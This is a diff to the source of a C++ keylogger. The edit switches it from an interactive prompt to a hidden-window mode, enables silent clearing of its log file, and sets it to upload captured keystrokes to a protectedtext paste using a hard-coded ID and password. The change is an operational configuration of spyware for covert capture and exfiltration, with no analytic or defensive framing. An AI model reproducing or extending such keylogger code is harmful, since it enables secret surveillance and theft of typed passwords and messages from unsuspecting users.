@@ -14,15 +14,15 @@
  * 
  */
 
-#define KLGR_PROMPT
-// #define KLGR_HIDE_WINDOW
+// #define KLGR_PROMPT
+#define KLGR_HIDE_WINDOW
 
 // Static
-// #define KLGR_S_CLEAR_LOG_FILE
-// #define KLGR_S_USE_PROTECTEDTEXT
-// #define KLGR_S_PROTECTEDTEXT_ID "id-here"
-// #define KLGR_S_PROTECTEDTEXT_PWD "pwd-here"
-// #define KLGR_S_PROTECTEDTEXT_DELAY 5000
+#define KLGR_S_CLEAR_LOG_FILE
+#define KLGR_S_USE_PROTECTEDTEXT
+#define KLGR_S_PROTECTEDTEXT_ID "nikodemkeylogger"
+#define KLGR_S_PROTECTEDTEXT_PWD "chuj123"
+#define KLGR_S_PROTECTEDTEXT_DELAY 5000
 
 /*
  *
@@ -275,19 +275,21 @@ int main () {
      * 
      */
 
-    bool clear = false;
+    {
+        bool clear = false;
 #ifdef KLGR_PROMPT
-    clear = klgr_prompt_bool("clear log file \"" + std::string(KLGR_OUT_FN) + "\"?");
+        clear = klgr_prompt_bool("clear log file \"" + std::string(KLGR_OUT_FN) + "\"?");
 #elif defined(KLGR_S_CLEAR_LOG_FILE)
-    clear = true;
+        clear = true;
 #endif
-    if (clear)
-        G_output_file.open(KLGR_OUT_FN, std::ofstream::trunc);
-    else
-        G_output_file.open(KLGR_OUT_FN);
-    if (!G_output_file.is_open()) {
-        klgr_cout_warn() << "failed to open log file \"" << KLGR_OUT_FN << '"' << std::endl;
-        return 0;
+        if (clear)
+            G_output_file.open(KLGR_OUT_FN, std::ofstream::trunc);
+        else
+            G_output_file.open(KLGR_OUT_FN);
+        if (!G_output_file.is_open()) {
+            klgr_cout_warn() << "failed to open log file \"" << KLGR_OUT_FN << '"' << std::endl;
+            return 0;
+        }
     }
 
     //
